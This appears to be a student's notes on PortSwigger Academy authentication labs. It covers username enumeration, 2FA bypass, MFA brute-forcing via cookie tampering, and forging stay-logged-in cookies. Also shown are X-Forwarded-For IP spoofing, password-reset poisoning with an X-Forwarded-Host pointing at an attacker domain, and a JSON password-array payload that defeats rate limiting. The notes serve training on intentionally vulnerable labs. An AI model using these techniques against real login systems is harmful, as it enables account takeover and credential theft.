# Authentication Attacks LABS (Portswigger Academy)

### Labs from Portswigger Academy

#### Lab 1: Username enumeration via different responses

```
fuzz the username, it will give different response for valid username.
e.g; Invalid username vs Invalid Password
```

#### Lab 2: 2FA simple bypass

```
directly visit the 2FA endpoint
if it doesnot work, change the referrer header as if we came from the 2FA page
```

#### Lab 3: Password reset broken logic

```
the idea is, when i try to reset the password, web app sends mail containing password reset url containing temp-forgot-password-token
then for the acutal password reset function, post request is sent with this temp-forgot-password-token in url and body along with new password

here, we can simply change the temp-forgot-password-token to something else (matching in both url and body)
```

#### Lab 4: Username enumeration via subtly different responses

```
Invalid username or password.  (for invalid username)
vs
Invalid username or password   (for a valid username)

in response during username enumeration
```

#### Lab 5: Username enumeration via response timing

```
Use X-Forwarded-For header to bypass IP blocking

it first checks the username and then checks password, meaning we can set password to random long value then we get difference in reponse.
if the username is valid then only it will move to password checking phase

hence
higher response timing (for valid username)
lower response timing (for invalid username)


```

#### Lab 6: Broken brute-force protection, IP block

```
there is a counter measuring the failed login attempts, after certain failed attempts it blocks our IP

we can reset the counter by triggering a successful login.

i.e

wiener - peter   --> correct creds
carlos - kek
carlos - kek2
wiener - peter   --> correct creds
carlos - kek3 

```

#### Lab 7: Username enumeration via account lock

```
try multiple login attempt for all accounts, 
valid account will lock after certain attempts
based on this we can filter valid accounts.
```

#### Lab 8: 2FA broken logic

```
There exist cookie verify=carlos,
we can request MFA-CODE for any user by changing this verify cookie, 
after requesting the MFA-CODE, we can simply brute force it to get access

workflow

[login with creds] --> POST /login 
[Generating MFA-CODE]  --> GET /login2 (in here change the verify cookie to our desired one)
[Entering MFA-CODE]  --> POST /login2 (also change the verify cookie and bruteforce the MFA-CODE)
```

#### Lab 9: Brute-forcing a stay-logged-in cookie

```
When we tick stay logged in, it gives us stay-logged-in.
stay-logged-in is made up of base64(username:md5(password))

from given password wordlist we create new encoded wordlist and bruteforce for valid cookie and hence get respective pasword
```

#### Lab 10: Offline password cracking

```
stay-logged-in cookie exist, no password wordlist available, 
instead, we use XSS to grab target's cookie decode it and get password.
```

#### Lab 11: Password reset poisoning via middleware

```
There exist password reset function, which sends mail containing password reset url; http://website.com/forgot-password?temp-forgot-pass={sometoken}

We add X-Forwarded-Host: dollarboysushil.com header where dollarboysushil.com is the url we control
after sending request with X-Forwarded-Host, the sent mail's url changes

without X-Forwarded-Host  --> http://website.com/forgot-password?temp-forgot-pass={sometoken}
with X-Forwarded-Host: dollarboysushil.com --> http://dollarboysushil.com/forgot-password?temp-forgot-pass={sometoken}


now when user click's on edited url, we get hit and can use the temp-forgot-pass token and reset the password.

```

#### Lab 12: Password brute-force via password change

```json
password reset request is

username=wiener&current-password=peter&new-password-1=peter1&new-password-2=peter2

if current-password match but new-password 's donot match --> New Password do not match
if current-password donot match but new-password 's match --> Logout

so, we can bruteforce current-password by setting new-password's different.

```

#### Lab 13: Broken brute-force protection, multiple credentials per request `EXPERT LEVEL`

```json
login request contains

{"username":"carlos","password":"peter"}

there exist brute-force protection, which can be bypassed by doing.


{
  "username": "carlos",
  "password": [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345"
  ]
}
This allows multiple passwords to be tested in a single request, effectively bypassing the rate-limiting mechanism.

Then we can simply use the session cookie with 302 response

```
